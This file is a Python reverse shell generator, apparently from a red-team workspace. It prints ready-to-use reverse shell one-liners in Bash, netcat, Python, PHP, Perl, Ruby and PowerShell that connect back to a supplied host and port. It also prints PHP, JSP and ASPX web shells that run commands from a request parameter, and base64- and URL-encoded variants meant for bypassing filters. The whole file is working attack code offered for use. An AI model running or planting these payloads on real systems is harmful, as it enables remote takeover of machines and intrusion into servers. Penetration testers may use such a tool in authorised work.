#!/usr/bin/env python3
"""
Reverse Shell Generator - Genera payloads de reverse shell
Uso: python3 reverse_shell_generator.py <LHOST> <LPORT>
"""

import sys
import base64
import urllib.parse

def banner():
    print("""
╔═══════════════════════════════════════════╗
║     🐚 Reverse Shell Generator 🐚         ║
║         Red Team Workspace                ║
╚═══════════════════════════════════════════╝
    """)

def generate_shells(lhost, lport):
    shells = {
        "Bash TCP": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Bash UDP": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "Netcat -e": f"nc -e /bin/bash {lhost} {lport}",
        "Netcat mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    }
    
    return shells

def generate_web_shells(lhost, lport):
    web_shells = {
        "PHP Simple": "<?php system($_GET['cmd']); ?>",
        "PHP Reverse": f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
        "JSP": f"""<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {{
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while(dirone != null) {{
        out.println(dirone);
        dirone = dis.readLine();
    }}
}}
%>""",
        "ASPX": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>""",
    }
    return web_shells

def main():
    banner()
    
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <LHOST> <LPORT>")
        print(f"Ejemplo: {sys.argv[0]} 192.168.1.100 4444")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    print("\n" + "="*60)
    
    # Generate reverse shells
    print("\n🐚 REVERSE SHELLS\n")
    shells = generate_shells(lhost, lport)
    
    for name, shell in shells.items():
        print(f"\n[+] {name}:")
        print("-" * 50)
        print(shell)
    
    # Generate web shells
    print("\n" + "="*60)
    print("\n🌐 WEB SHELLS\n")
    web_shells = generate_web_shells(lhost, lport)
    
    for name, shell in web_shells.items():
        print(f"\n[+] {name}:")
        print("-" * 50)
        print(shell)
    
    # Base64 encoded bash for bypassing
    print("\n" + "="*60)
    print("\n🔐 ENCODED PAYLOADS\n")
    
    bash_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64_payload = base64.b64encode(bash_cmd.encode()).decode()
    print(f"[+] Base64 Bash:")
    print(f"echo {b64_payload} | base64 -d | bash")
    
    url_payload = urllib.parse.quote(bash_cmd)
    print(f"\n[+] URL Encoded Bash:")
    print(url_payload)
    
    print("\n" + "="*60)
    print("\n[!] Recuerda iniciar tu listener:")
    print(f"    nc -lvnp {lport}")
    print(f"    rlwrap nc -lvnp {lport}")
    print("\n")

if __name__ == "__main__":
    main()
